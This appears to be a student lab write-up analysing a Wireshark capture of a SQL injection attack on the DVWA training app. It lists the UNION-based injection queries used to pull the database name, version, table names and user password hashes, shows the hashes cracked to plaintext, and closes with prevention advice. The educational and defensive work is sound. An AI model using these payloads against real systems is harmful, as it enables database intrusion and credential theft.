# SQL Injection Attack – Full Analysis

## 🎯 Objective

Analyze a captured SQL injection attack using Wireshark to understand how an attacker probes, extracts, and exploits a vulnerable MySQL database.

---

## ⚙️ Setup

| Detail | Info |
|---|---|
| **Tool** | Wireshark (PCAP file) |
| **Attacker IP** | `10.0.2.4` |
| **Target IP** | `10.0.2.15` |
| **Capture Duration** | ~8 minutes (441 seconds) |
| **Target App** | DVWA (Damn Vulnerable Web Application) |

---

## 📦 Part 1 – Loading the PCAP File

Opened the provided PCAP file in Wireshark. The capture contains all network traffic from an 8-minute SQL injection attack between two hosts.

**IPs involved:**
- `10.0.2.4` → Attacker
- `10.0.2.15` → Target (MySQL database server)

> 📸 Screenshot: Full packet capture view
![Full Packet View](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20151107.png)

---

## 📦 Part 2 – First Injection Attempt (Line 13)

Selected **line 13** — a GET HTTP request — and followed the HTTP stream (`Right click → Follow → HTTP Stream`).

### What I saw:
- **Red** = Attacker (`10.0.2.4`) sending a GET request to the target
- **Blue** = Target (`10.0.2.15`) responding

> 📸 Screenshot: HTTP GET Request and Response Colors
![HTTP GET Request and Response Colors](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20151453.png)

### Query used:
```
1=1
```

### What happened:
The attacker entered `1=1` into a UserID search box to test if the application was vulnerable to SQL injection.

Instead of returning a login failure, **the application returned a database record.**

> **Why does `1=1` work?**  
> It creates an SQL statement that is always true. No matter what is entered, the condition evaluates to true — so the database returns results it should never expose.

✅ **Vulnerability confirmed.**

> 📸 Screenshot: HTTP stream of line 13

![HTTP Stream Line 13](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20153300.png)

---

## 📦 Part 3 – Extracting Database Info (Line 19)

### Query used:
```sql
1' or 1=1 union select database(), user()#
```

### What was returned:
| Info | Value |
|---|---|
| **Database name** | `dvwa` |
| **Database user** | `root@localhost` |

Multiple user accounts were also displayed in the response.

> **What this means:**  
> The attacker now knows the database name and that the app is running as `root` — the highest privilege level. This is a critical misconfiguration.

> 📸 Screenshot: HTTP stream of line 19

![HTTP Stream Line 19](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20153703.png)

---

## 📦 Part 4 – Extracting Version Info (Line 22)

### Query used:
```sql
1' or 1=1 union select null, version()#
```

### What was returned:
| Info | Value |
|---|---|
| **MySQL Version** | `5.7.12-0` |

The version identifier appeared at the end of the HTML output.

> **Why does version matter?**  
> Knowing the exact version lets an attacker look up known vulnerabilities specific to that version.

> 📸 Screenshot: HTTP stream of line 22

![HTTP Stream Line 22](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20154338.png)

---

## 📦 Part 5 – Extracting Table Names (Line 25)

### Query used:
```sql
1' or 1=1 union select null, table_name from information_schema.tables#
```

### What was returned:
A large output of all table names in the database.

> **Why is this dangerous?**  
> The attacker now has a full map of the database structure and knows exactly which tables to target next.

> 📸 Screenshot: HTTP stream of line 25

![HTTP Stream Line 25](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20155000.png)

---

## 📦 Part 6 – Extracting Credentials (Line 28)

### Query used:
```sql
1' or 1=1 union select user, password from users#
```

### What was returned — Hashed passwords:

| Username | Hash |
|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` |
| gordonb | `e99a18c428cb38d5f260853678922e03` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` |

### Cracked with CrackStation:

| Username | Password |
|---|---|
| admin | `password` |
| gordonb | `abc123` |
| 1337 | `charley` |
| pablo | `letmein` |
| smithy | `password` |

> **Observation:** Weak, commonly used passwords. `admin` and `smithy` share the same hash — meaning they use the same password.

> 📸 Screenshot: HTTP stream of line 28

![HTTP Stream Line 28](https://github.com/Ben-ita66/sql-injection-lab/blob/main/screenshots/screenshots/Screenshot%202026-03-26%20155547.png)

---

## 🔄 Attack Summary

| Step | Query | Result |
|---|---|---|
| 1 | `1=1` | Confirmed vulnerability |
| 2 | `1' or 1=1 union select database(), user()#` | Got DB name + user |
| 3 | `1' or 1=1 union select null, version()#` | Got MySQL version |
| 4 | `1' or 1=1 union select null, table_name from information_schema.tables#` | Got all table names |
| 5 | `1' or 1=1 union select user, password from users#` | Extracted & cracked credentials |

---

## 🛡️ Prevention Techniques

**1. Parameterized Queries (Prepared Statements)**
The strongest defense. User input is treated as data only — never as executable SQL code.

**2. Stored Procedures**
Encapsulates SQL logic so user input can't alter the query structure.

**3. Input Validation & Sanitization**
Enforce expected types, lengths, and formats. If a field expects an integer ID, reject anything that isn't one.

**4. Principle of Least Privilege**
The database account used by the web app should have the minimum permissions needed. Running as `root` (as seen in this lab) is a critical mistake.

---

## ✅ Key Takeaways

- SQL injection exploits poor input handling to manipulate database queries
- A single vulnerable input field can expose an entire database
- Weak passwords make cracked hashes trivial to exploit
- Prevention starts at the code level — not the network level
